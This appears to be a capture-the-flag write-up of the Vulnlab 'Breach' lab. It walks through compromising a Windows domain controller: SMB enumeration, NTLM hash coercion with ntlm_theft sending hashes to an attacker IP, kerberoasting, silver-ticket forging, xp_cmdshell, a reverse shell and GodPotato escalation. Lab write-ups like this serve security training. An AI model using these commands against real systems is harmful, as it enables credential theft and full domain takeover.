# Vulnlab - Breach

```bash
PORT     STATE SERVICE       VERSION 
53/tcp   open  domain? 
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-03-12 16:03:34Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?              
464/tcp  open  kpasswd5?                                    
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2024-03-12T16:45:02+00:00; -20s from scanner time.
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback 
| Issuer: commonName=SSL_Self_Signed_Fallback
3389/tcp open  ms-wbt-server Microsoft Terminal Services 
|_ssl-date: 2024-03-12T16:06:32+00:00; -20s from scanner time.
| ssl-cert: Subject: commonName=BREACHDC.breach.vl
| Issuer: commonName=BREACHDC.breach.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-03-11T16:03:04
| Not valid after:  2024-09-10T16:03:04
| MD5:   6bef15efd66e365df68a7dc73029cee7
|_SHA-1: 7fce3649341af1319d2092a07f42efd473427203
| rdp-ntlm-info: 
|   Target_Name: BREACH
|   NetBIOS_Domain_Name: BREACH
|   NetBIOS_Computer_Name: BREACHDC
|   DNS_Domain_Name: breach.vl
|   DNS_Computer_Name: BREACHDC.breach.vl
|   DNS_Tree_Name: breach.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-03-12T16:05:52+00:00
Service Info: Host: BREACHDC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Accessing smb shares with null authentication, we'll be able to list available shares

<img src="https://i.imgur.com/CZIuO7Q.png"/>

From  `share` , we'll get 3 username directories

<img src="https://i.imgur.com/IE02TOZ.png"/>

We could have gotten domain users from brute forcing SID as well with `lookupsid.py`

<img src="https://i.imgur.com/79XueMv.png"/>

We can try AS-REP roasting but this didn't showed any user with pre-authentication not required

<img src="https://i.imgur.com/3Z1umhi.png"/>

## Coercing Authentication

In share, we have write access so we can upload files in any folder other than user directories as we don't have read access there

<img src="https://i.imgur.com/GoMoFHE.png"/>

So we can perform coerce authentication by uploading scf or lnk files but I am not sure which extension will lead to coercion so we can use `ntlm_theft` to upload all kinds of extension for this

```bash
python3 ./ntlm_theft.py --generate all --server 10.8.0.136 -f @a
```

<img src="https://i.imgur.com/ywBdfyu.png"/>

As soon as we'll upload the file, we'll receive NTLMv2 challenge/response hash of `Julia.Wong`

<img src="https://i.imgur.com/9RcjmW7.png"/>
This will get cracked easily through hashcat using rockyou.txt

<img src="https://i.imgur.com/tMG5kt0.png"/>
## Performing kerberoasting on mssql user

We already saw that there was `svc_mssql`, it's most likely a service account which can be kerberoastable

```bash
crackmapexec ldap breach.vl -u 'julia.wong' -p 'password' --kerberoasting kerberoast.txt
```

<img src="https://i.imgur.com/UDFGJUy.png"/>

Cracking this again with hashcat

<img src="https://i.imgur.com/j7hILVQ.png"/>

With these credentials we can try logging in on MSSQL service with `mssqclient.py` , but it gives us login failure

<img src="https://i.imgur.com/823VYBW.png"/>

Since we have the mssql service account, we can forge a silver ticket and impersonate administrator user on mssql

```bash
ticketer.py -nthash hash -domain-sid S-1-5-21-2330692793-3312915120-706255856 -domain breach.vl -spn 'MSSQL/breach.vl' administrator
```

<img src="https://i.imgur.com/shSZJJR.png"/>

<img src="https://i.imgur.com/HJTF0CL.png"/>

Now we just need to enable `xp_cmdshell` as it's disabled by default

<img src="https://i.imgur.com/gLOHOVr.png"/>

Downloading and executing netcat to get a reverse shell

<img src="https://i.imgur.com/AZXko4m.png"/>

This user has `SeImpersonate` privilege enabled through which we can impersonate/steal the token of any user including SYSTEM user

<img src="https://i.imgur.com/oXkFlFq.png"/>

Using `GodPotato` to escalate our privileges

<img src="https://i.imgur.com/XahBFyD.png"/>
  
# References

- https://github.com/BeichenDream/GodPotato
